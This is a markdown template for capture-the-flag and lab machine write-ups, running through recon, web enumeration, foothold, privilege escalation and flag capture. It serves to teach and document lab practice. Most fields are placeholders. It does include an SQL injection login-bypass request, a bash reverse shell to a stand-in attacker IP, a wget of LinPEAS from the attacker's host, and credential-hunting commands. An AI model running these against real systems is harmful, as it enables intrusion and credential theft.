# Writeup: [Machine/Challenge Name]

## 📋 Overview

- **Platform**: [HTB / VulnHub / TryHackMe / CTF / Other]
- **Difficulty**: [Easy / Medium / Hard / Insane]
- **Date Completed**: [Date]
- **Time Taken**: [Duration]
- **OS**: [Linux / Windows / Other]
- **IP Address**: [Target IP]
- **My IP**: [Your IP]

### Quick Summary
Brief 2-3 sentence summary of the machine and what made it interesting.

### Methodology
This writeup follows the [CTF Methodology](../../methodology/ctf/README.md) and [Unified Kill Chain](../../unified-kill-chain/README.md) framework.

---

## 🎯 Initial Reconnaissance

### Host Discovery
```bash
# Ping check
ping -c 4 <target_ip>

# Output
PING <target_ip> (<target_ip>) 56(84) bytes of data.
64 bytes from <target_ip>: icmp_seq=1 ttl=63 time=XX ms
```

**Analysis:** Target is alive and responding to ICMP.

### Port Scanning

#### Initial Scan (Top 1000 Ports)
```bash
nmap -sC -sV -oA initial_scan <target_ip>
```

**Output:**
```
Starting Nmap 7.94 ( https://nmap.org ) at YYYY-MM-DD HH:MM UTC
Nmap scan report for <target_ip>
Host is up (0.XXs latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH X.X (protocol 2.0)
80/tcp open  http    Apache httpd X.X.X
```

**Analysis:** 
- SSH on port 22 (OpenSSH X.X)
- HTTP on port 80 (Apache X.X.X)
- [Add any interesting observations]

#### Full Port Scan
```bash
nmap -p- -oA full_scan <target_ip>
```

**Output:**
```
[Full port scan results]
```

**Analysis:** [Any additional ports found?]

#### UDP Scan (if needed)
```bash
nmap -sU --top-ports 100 -oA udp_scan <target_ip>
```

---

## 🌐 Web Enumeration

### Initial Access
```bash
# Check HTTP response
curl -I http://<target_ip>

# Output
HTTP/1.1 200 OK
Date: ...
Server: Apache/X.X.X
Content-Type: text/html; charset=UTF-8
```

**Analysis:** [What does the initial response tell us?]

### Technology Identification
```bash
whatweb http://<target_ip>
```

**Output:**
```
http://<target_ip> [200 OK] Apache[X.X.X], Country[XX], HTML5, HTTPServer[Apache/X.X.X]
```

**Analysis:** [Technologies identified]

### Directory Bruteforcing
```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_scan.txt
```

**Output:**
```
/admin                (Status: 301) [Size: XXX] [--> http://<target_ip>/admin/]
/api                  (Status: 200) [Size: XXX]
/backup               (Status: 200) [Size: XXX]
```

**Analysis:** 
- `/admin` - Admin panel (redirects)
- `/api` - API endpoint
- `/backup` - Potential backup files

### Manual Exploration

#### Page Source Analysis
- [ ] Check page source for comments, hidden forms, JavaScript
- [ ] Look for API endpoints in JavaScript
- [ ] Check for exposed credentials or tokens

**Findings:**
```
<!-- Found in source: -->
<!-- API Key: xxxxx -->
```

#### Robots.txt
```bash
curl http://<target_ip>/robots.txt
```

**Output:**
```
User-agent: *
Disallow: /admin/
Disallow: /backup/
```

**Analysis:** [What does this reveal?]

#### Common Files Check
```bash
# Check for common files
curl http://<target_ip>/.git/config
curl http://<target_ip>/config.php.bak
curl http://<target_ip>/backup.sql
```

---

## 🔍 Service Enumeration

### SSH (Port 22)
```bash
# Banner grabbing
nc <target_ip> 22
```

**Output:**
```
SSH-2.0-OpenSSH_X.X
```

**Analysis:** [Version, potential vulnerabilities?]

### Additional Services
[Document enumeration of other services found]

---

## 💥 Initial Foothold

### Vulnerability Identified
**Type:** [SQL Injection / Command Injection / File Upload / Authentication Bypass / etc.]

**Location:** [Where was it found? e.g., Login form, search parameter, file upload]

**Description:** 
Detailed explanation of the vulnerability, why it exists, and how it can be exploited.

### Exploitation Steps

#### Step 1: [What you're testing]
```bash
# Command or request
curl -X POST http://<target_ip>/login -d "username=admin' OR '1'='1'--&password=test"
```

**Output:**
```
[Response showing vulnerability]
```

**Analysis:** [What does this tell us?]

#### Step 2: [Next step]
```bash
# Next command
```

**Output:**
```
[Output]
```

**Analysis:** [What we learned]

#### Step 3: [Exploitation]
```bash
# Final exploitation command
```

**Output:**
```
[Proof of exploitation]
```

### Proof of Concept
```bash
# Commands that demonstrate the vulnerability
```

**Screenshot/Output:**
```
[Actual output showing successful exploitation]
```

### Initial Shell
```bash
# How you got initial shell
bash -i >& /dev/tcp/<your_ip>/4444 0>&1
```

**Listener:**
```bash
nc -lvp 4444
```

**Output:**
```
[Shell output]
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Analysis:** 
- Initial access as `www-data`
- Limited privileges
- Need to escalate

---

## 🔐 Post-Exploitation Enumeration

### System Information
```bash
uname -a
cat /etc/os-release
```

**Output:**
```
Linux <hostname> X.X.X-generic #XX-Ubuntu SMP ...
```

**Analysis:** [OS version, kernel version]

### Current User Context
```bash
whoami
id
pwd
```

**Output:**
```
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html
```

### Network Information
```bash
ifconfig
ip addr
netstat -antp
```

**Output:**
```
[Network configuration]
```

**Analysis:** [Network interfaces, connections]

### Process Enumeration
```bash
ps aux
```

**Output:**
```
[Running processes]
```

**Analysis:** [Interesting processes, services running as root?]

### File System Enumeration
```bash
# Check for interesting files
find / -name "*.txt" -o -name "*.conf" -o -name "*.log" 2>/dev/null | head -20
ls -la /home/
ls -la /var/www/
```

**Findings:**
- [Interesting files found]
- [Configuration files]
- [Potential credentials]

### Credential Hunting
```bash
# Search for passwords, keys, tokens
grep -r "password" /var/www/ 2>/dev/null
find / -name "*.key" -o -name "*.pem" 2>/dev/null
```

**Findings:**
```
[Credentials or keys found]
```

---

## ⬆️ Privilege Escalation

### Automated Enumeration
```bash
# Download and run LinPEAS
wget http://<your_ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Key Findings:**
- [ ] Sudo misconfiguration
- [ ] SUID binary
- [ ] Writable file in PATH
- [ ] Cron job
- [ ] Kernel exploit
- [ ] Service running as root

### Manual Enumeration

#### Sudo Permissions
```bash
sudo -l
```

**Output:**
```
User www-data may run the following commands on <hostname>:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

**Analysis:** 
- Can run Python script as root without password
- Need to check if script is writable or has vulnerabilities

#### SUID Binaries
```bash
find / -perm -4000 2>/dev/null
```

**Output:**
```
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/custom_binary
```

**Analysis:** [Any unusual SUID binaries?]

#### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
```

**Output:**
```
[ Cron jobs found ]
```

**Analysis:** [Any writable cron jobs or scripts?]

### Privilege Escalation Method

**Method:** [SUID / Sudo / Cron / Kernel / Service / etc.]

**Description:**
Detailed explanation of why this method works and how to exploit it.

#### Step 1: [Preparation]
```bash
# Commands to prepare exploitation
```

#### Step 2: [Exploitation]
```bash
# Commands to exploit
```

**Output:**
```
[Output showing successful exploitation]
```

#### Step 3: [Verification]
```bash
whoami
id
```

**Output:**
```
root
uid=0(root) gid=0(root) groups=0(root)
```

**Analysis:** Successfully escalated to root!

### Alternative Methods Attempted
[Document other methods you tried that didn't work - this is educational!]

**Method 1:** [What you tried]
- **Why it didn't work:** [Explanation]
- **What you learned:** [Takeaway]

**Method 2:** [Another attempt]
- **Why it didn't work:** [Explanation]

---

## 🏁 Root Access & Flag Retrieval

### Root Shell
```bash
# Final commands to get root
```

**Proof:**
```bash
$ whoami
root
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat /root/root.txt
HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

### User Flag
```bash
cat /home/*/user.txt
# or
cat /home/<user>/Desktop/user.txt
```

**Output:**
```
HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

### Root Flag
```bash
cat /root/root.txt
```

**Output:**
```
HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

---

## 📚 Key Learnings & Takeaways

### New Techniques Learned
1. **[Technique name]** - [Brief description and when to use it]
2. **[Another technique]** - [Description]

### Tools Discovered
- **[Tool name]** - [What it does and when to use it]
- **[Another tool]** - [Description]

### Concepts Reinforced
- [Concept 1]
- [Concept 2]

### What Could Be Improved
- [What you struggled with and how you'd approach it differently next time]
- [Areas where you spent too much time]

### Alternative Approaches
- [Other ways this machine could have been solved]
- [Different tools that could have been used]

---

## 🛠️ Tools Used

| Tool | Purpose | Command/Usage |
|------|---------|---------------|
| Nmap | Port scanning | `nmap -sC -sV <target>` |
| Gobuster | Directory bruteforcing | `gobuster dir -u <url> -w <wordlist>` |
| [Tool] | [Purpose] | [Command] |

---

## 🔗 References & Resources

### Related Techniques
- [Link to Unified Kill Chain phase]
- [Link to technique documentation]

### Documentation
- [CVE references]
- [Exploit references]
- [Tool documentation]

### Similar Machines
- [Similar machines/challenges]
- [Related writeups]

### IppSec Videos
- [If IppSec has a video on similar techniques]

---

## 📊 Attack Path Summary

```
Reconnaissance
    ↓
Web Enumeration
    ↓
[Vulnerability Found]
    ↓
Initial Foothold (www-data)
    ↓
Post-Exploitation Enumeration
    ↓
[Privilege Escalation Method]
    ↓
Root Access
```

---

## 🏷️ Tags

- #writeup
- #htb / #vulnhub / #tryhackme / #ctf
- #[difficulty]
- #[os]
- #[technique] (e.g., #sqli #fileupload #sudo)

---

## 📝 Notes

### Time Breakdown
- **Reconnaissance:** [X minutes]
- **Initial Foothold:** [X minutes]
- **Privilege Escalation:** [X minutes]
- **Total:** [X hours/minutes]

### Struggles & Solutions
- **Problem:** [What you got stuck on]
- **Solution:** [How you solved it]
- **Time wasted:** [How long you spent]

### Tips for Future
- [Tips for solving similar machines]
- [Things to check first]
- [Common pitfalls to avoid]

---

## Last Updated
[Date]

---

## 🎬 Video Walkthrough
[Link to your video walkthrough if you made one]

## 📸 Screenshots
[Links to key screenshots]
